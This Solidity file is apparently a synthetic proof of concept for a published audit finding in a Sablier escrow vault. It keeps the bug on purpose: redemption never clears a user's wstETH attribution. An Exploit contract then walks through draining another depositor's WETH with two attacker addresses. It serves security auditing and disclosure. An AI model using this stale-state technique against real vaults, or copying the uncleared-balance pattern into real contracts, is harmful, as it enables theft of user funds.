// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sablier Bob Escrow — Adapter vault `_userWstETH` not cleared after
    redemption enables theft of other users' funds
    (Cyfrin / MrPotatoMagic, finding #65582)  HIGH
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: When a user redeems shares from an adapter vault via
    SablierBob::redeem, shares are burned but `_userWstETH` in
    SablierLidoAdapter is never cleared or decremented. Burns also skip
    BobVaultShare::_update's onShareTransfer notify (only real transfers
    call it). An attacker with two addresses redeems from A (stale
    _userWstETH remains), transfers B's shares to A (wstETH compounds on
    the stale balance), then redeems again with an inflated wstETH ratio
    and drains every other depositor's WETH.

    Vulnerable lines preserved below (@> VULN). Recommended fix: clear
    `_userWstETH` on redeem (later shipped as processRedemption). */

/// @dev Minimal ERC20 used as WETH.
contract MockWETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allowance");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced SablierLidoAdapter — tracks per-user wstETH and computes
///      redeem payouts. `calculateAmountToTransferWithYield` is a pure view
///      that never clears `_userWstETH` (the bug).
contract SablierLidoAdapter {
    MockWETH public immutable WETH;
    address public sablierBob;

    mapping(uint256 => mapping(address => uint128)) internal _userWstETH;
    mapping(uint256 => uint128) internal _vaultTotalWstETH;
    mapping(uint256 => uint128) internal _wethReceivedAfterUnstaking;

    constructor(MockWETH weth_) {
        WETH = weth_;
    }

    function setSablierBob(address bob_) external {
        require(sablierBob == address(0), "set");
        sablierBob = bob_;
    }

    modifier onlyBob() {
        require(msg.sender == sablierBob, "only bob");
        _;
    }

    function getYieldBearingTokenBalanceFor(uint256 vaultId, address user) external view returns (uint128) {
        return _userWstETH[vaultId][user];
    }

    function getTotalYieldBearingTokenBalance(uint256 vaultId) external view returns (uint128) {
        return _vaultTotalWstETH[vaultId];
    }

    function getWethReceivedAfterUnstaking(uint256 vaultId) external view returns (uint256) {
        return _wethReceivedAfterUnstaking[vaultId];
    }

    /// @dev Simplified stake: 1 WETH → 1 "wstETH" unit of attribution.
    function stake(uint256 vaultId, address user, uint256 amount) external onlyBob {
        _userWstETH[vaultId][user] += uint128(amount);
        _vaultTotalWstETH[vaultId] += uint128(amount);
    }

    /// @dev Record WETH received after unstaking (yield already sitting on Bob).
    function unstakeFullAmount(uint256 vaultId, uint128 amountReceivedFromUnstaking) external onlyBob {
        _wethReceivedAfterUnstaking[vaultId] = amountReceivedFromUnstaking;
    }

    /// @dev VERBATIM reduction of calculateAmountToTransferWithYield.
    ///      Reads `_userWstETH` but never clears it — so after a redeem the
    ///      stale balance can be compounded via a subsequent share transfer.
    function calculateAmountToTransferWithYield(
        uint256 vaultId,
        address user,
        uint128 /* shareBalance */
    ) external view returns (uint128 transferAmount, uint128 feeAmountDeductedFromYield) {
        uint256 totalWstETH = _vaultTotalWstETH[vaultId];
        uint256 totalWeth = _wethReceivedAfterUnstaking[vaultId];
        if (totalWstETH == 0 || totalWeth == 0) {
            return (0, 0);
        }

        // @> VULN: reads stale `_userWstETH` that is NEVER cleared on redeem;
        //    burns skip onShareTransfer, so attribution survives and can be
        //    compounded when more shares are later transferred to `user`.
        //    FIX: clear `_userWstETH[vaultId][user]` (and decrement total) in a
        //    state-changing processRedemption called from redeem.
        uint256 userWstETH = _userWstETH[vaultId][user];

        uint128 userWethShare = uint128((userWstETH * totalWeth) / totalWstETH);
        // feeOnYield = 0 in this synthetic (isolates the stale-state theft)
        transferAmount = userWethShare;
        feeAmountDeductedFromYield = 0;
    }

    /// @dev VERBATIM reduction of updateStakedTokenBalance — proportional move.
    function updateStakedTokenBalance(
        uint256 vaultId,
        address from,
        address to,
        uint256 shareAmountTransferred,
        uint256 userShareBalanceBeforeTransfer
    ) external onlyBob {
        uint256 fromWstETH = _userWstETH[vaultId][from];
        require(userShareBalanceBeforeTransfer != 0, "zero bal");
        uint128 wstETHToTransfer =
            uint128((fromWstETH * shareAmountTransferred) / userShareBalanceBeforeTransfer);
        _userWstETH[vaultId][from] -= wstETHToTransfer;
        _userWstETH[vaultId][to] += wstETHToTransfer;
    }
}

/// @dev Reduced BobVaultShare — ERC20 shares; burns do NOT notify Bob.
contract BobVaultShare {
    string public name = "Bob Vault Share";
    string public symbol = "BVS";
    uint8 public decimals = 18;

    address public sablierBob;
    uint256 public constant VAULT_ID = 1;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function setSablierBob(address bob_) external {
        require(sablierBob == address(0), "set");
        sablierBob = bob_;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == sablierBob, "only bob");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        require(msg.sender == sablierBob, "only bob");
        // Burn path: to == address(0) — must NOT call onShareTransfer.
        // This is the BobVaultShare::_update condition from the report:
        //   if (from != address(0) && to != address(0)) { onShareTransfer(...) }
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    /// @dev Transfer notifies Bob (real transfers only — not mint/burn).
    function _transfer(address from, address to, uint256 amount) internal {
        uint256 fromBalanceBefore = balanceOf[from];
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        // Verbatim condition from BobVaultShare::_update:
        if (from != address(0) && to != address(0)) {
            SablierBob(sablierBob).onShareTransfer(VAULT_ID, from, to, amount, fromBalanceBefore);
        }
    }
}

/// @dev Reduced SablierBob — enter / redeem / onShareTransfer / unstake.
contract SablierBob {
    MockWETH public immutable WETH;
    SablierLidoAdapter public immutable adapter;
    BobVaultShare public immutable shareToken;
    uint256 public constant VAULT_ID = 1;
    bool public isStakedInAdapter = true;

    constructor(MockWETH weth_, SablierLidoAdapter adapter_, BobVaultShare share_) {
        WETH = weth_;
        adapter = adapter_;
        shareToken = share_;
    }

    function enter(address user, uint128 amount) external {
        // Pull WETH from `user` (caller may be user or orchestrator with approval).
        require(WETH.transferFrom(user, address(this), amount), "pull");
        shareToken.mint(user, amount);
        adapter.stake(VAULT_ID, user, amount);
    }

    /// @dev Inject yield and record unstaking result. Permissionless once vault
    ///      is "settled" (folded into this call for the synthetic).
    function unstakeTokensViaAdapter(uint128 wethReceivedWithYield) external {
        require(isStakedInAdapter, "already");
        // Yield is minted onto Bob so redemptions have enough backing.
        uint256 onHand = WETH.balanceOf(address(this));
        if (wethReceivedWithYield > onHand) {
            WETH.mint(address(this), wethReceivedWithYield - onHand);
        }
        adapter.unstakeFullAmount(VAULT_ID, wethReceivedWithYield);
        isStakedInAdapter = false;
    }

    /// @dev Vulnerable redeem: burns shares, pays out from stale `_userWstETH`,
    ///      never clears adapter attribution.
    function redeem(address user) external returns (uint128 transferAmount) {
        uint128 shareBalance = uint128(shareToken.balanceOf(user));
        require(shareBalance > 0, "no shares");

        if (isStakedInAdapter) {
            // Not used in the attack path (we unstake first), kept for shape.
            revert("still staked");
        }

        uint128 feeAmountDeductedFromYield;
        (transferAmount, feeAmountDeductedFromYield) =
            adapter.calculateAmountToTransferWithYield(VAULT_ID, user, shareBalance);

        // *** BUG: no adapter.clearUserWstETH(VAULT_ID, user) here ***
        // FIX: adapter.processRedemption / clearUserWstETH after the calc.

        shareToken.burn(user, shareBalance);
        require(WETH.transfer(user, transferAmount), "pay");
    }

    function onShareTransfer(
        uint256 vaultId,
        address from,
        address to,
        uint256 amount,
        uint256 fromBalanceBefore
    ) external {
        require(msg.sender == address(shareToken), "share only");
        adapter.updateStakedTokenBalance(vaultId, from, to, amount, fromBalanceBefore);
    }
}

/// @dev Helper EOA-like party that holds shares/WETH and can transfer shares.
contract Party {
    function approve(MockWETH weth, address spender, uint256 amt) external {
        weth.approve(spender, amt);
    }

    function transferShares(BobVaultShare share, address to) external {
        share.transfer(to, share.balanceOf(address(this)));
    }
}

/// @dev Orchestrator. CREATE order (nonces start at 1):
///      1 MockWETH, 2 SablierLidoAdapter, 3 BobVaultShare, 4 SablierBob,
///      5 AttackerB (Party), 6 Victim (Party).
contract Exploit {
    MockWETH public weth; // CREATE 1
    SablierLidoAdapter public adapter; // CREATE 2 — vulnerable
    BobVaultShare public share; // CREATE 3
    SablierBob public bob; // CREATE 4
    Party public attackerB; // CREATE 5
    Party public victim; // CREATE 6

    uint128 public constant DEPOSIT = 100 ether;
    uint128 public constant TOTAL_WITH_YIELD = 330 ether; // 300 deposit + 30 yield

    constructor() {
        weth = new MockWETH();
        adapter = new SablierLidoAdapter(weth);
        share = new BobVaultShare();
        bob = new SablierBob(weth, adapter, share);
        adapter.setSablierBob(address(bob));
        share.setSablierBob(address(bob));
        attackerB = new Party();
        victim = new Party();

        // Fund the three depositors (A = this, B, C).
        weth.mint(address(this), DEPOSIT);
        weth.mint(address(attackerB), DEPOSIT);
        weth.mint(address(victim), DEPOSIT);
    }

    function run() external {
        // --- 1. Three users deposit 100 WETH each into the adapter vault ---
        weth.approve(address(bob), DEPOSIT);
        bob.enter(address(this), DEPOSIT);

        attackerB.approve(weth, address(bob), DEPOSIT);
        bob.enter(address(attackerB), DEPOSIT);

        victim.approve(weth, address(bob), DEPOSIT);
        bob.enter(address(victim), DEPOSIT);

        // Attribution: each user has 100 wstETH; vault total 300.
        require(adapter.getYieldBearingTokenBalanceFor(1, address(this)) == DEPOSIT, "A wst");
        require(adapter.getTotalYieldBearingTokenBalance(1) == 3 * DEPOSIT, "tot");

        // --- 2. Vault settles; unstake converts 300 wstETH → 330 WETH (yield) ---
        bob.unstakeTokensViaAdapter(TOTAL_WITH_YIELD);
        require(adapter.getWethReceivedAfterUnstaking(1) == TOTAL_WITH_YIELD, "weth rec");

        // --- 3. Attacker A redeems — paid 110, but `_userWstETH[A]` stays 100 ---
        bob.redeem(address(this));
        uint256 afterFirst = weth.balanceOf(address(this));
        require(afterFirst == 110 ether, "first redeem 110");

        // BUG: stale attribution persists after redeem.
        require(
            adapter.getYieldBearingTokenBalanceFor(1, address(this)) == DEPOSIT,
            "BUG: _userWstETH not cleared"
        );

        // --- 4. Attacker B transfers all shares to A → wstETH compounds ---
        attackerB.transferShares(share, address(this));
        uint128 inflated = adapter.getYieldBearingTokenBalanceFor(1, address(this));
        // stale 100 + transferred 100 = 200
        require(inflated == 2 * DEPOSIT, "inflated 200");

        // --- 5. A redeems again with inflated wstETH → 220 WETH ---
        bob.redeem(address(this));
        uint256 afterSecond = weth.balanceOf(address(this));
        // 110 + 220 = 330 — entire vault drained
        require(afterSecond == TOTAL_WITH_YIELD, "drained 330");

        // --- 6. Victim still has shares but cannot redeem — Bob has 0 WETH ---
        require(share.balanceOf(address(victim)) == DEPOSIT, "victim shares");
        require(weth.balanceOf(address(bob)) == 0, "bob empty");

        // Victim redeem would try to pay 110 but Bob is empty → revert.
        (bool ok,) = address(bob).call(abi.encodeWithSelector(SablierBob.redeem.selector, address(victim)));
        require(!ok, "victim should fail");

        // Harm: attacker (A+B capital 200) extracted 330 — stole victim's 110.
        require(afterSecond > (TOTAL_WITH_YIELD * 2) / 3, "more than fair 2/3");
        uint256 stolen = afterSecond - (TOTAL_WITH_YIELD * 2) / 3;
        require(stolen == 110 ether, "stole victim share");
    }
}
